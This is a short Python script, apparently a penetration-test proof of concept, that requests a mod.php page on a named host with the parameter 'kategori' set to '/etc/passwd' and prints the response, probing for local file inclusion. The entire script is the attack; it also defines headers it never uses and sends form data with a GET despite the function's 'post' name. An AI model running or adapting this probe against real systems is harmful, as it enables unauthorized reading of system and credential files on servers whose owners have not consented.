import requests

def post_request_with_evidence():
    url = "https://testportal.helium.sh/mod.php"
    params = {
        'kategori': '/etc/passwd'
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    response = requests.get(url, data=params)
    
    print("Status Code:", response.status_code)
    print("Headers:", response.headers)
    return response.text

if __name__ == "__main__":
    response = post_request_with_evidence()
    print(response)